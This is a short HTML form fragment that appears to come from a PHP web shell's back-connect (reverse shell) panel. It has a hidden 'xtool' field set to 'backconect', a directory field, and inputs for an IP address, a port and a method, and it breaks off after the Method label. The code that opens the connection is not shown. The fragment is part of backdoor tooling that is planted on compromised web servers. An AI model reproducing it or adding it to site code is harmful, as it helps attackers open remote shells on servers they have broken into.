                <input name='xtool' value='backconect' type='hidden'>
                <input type='hidden' name='d' value='%s'>
                    <label for='ip'>IP :</label>
                        <input type='text' name='ip' id='ip' value='%s' >
                    <label for='port'>Port :</label>
                        <input type='text' name='port' id='port' value='%s' > 
                        <label for='use'>Method :</label>
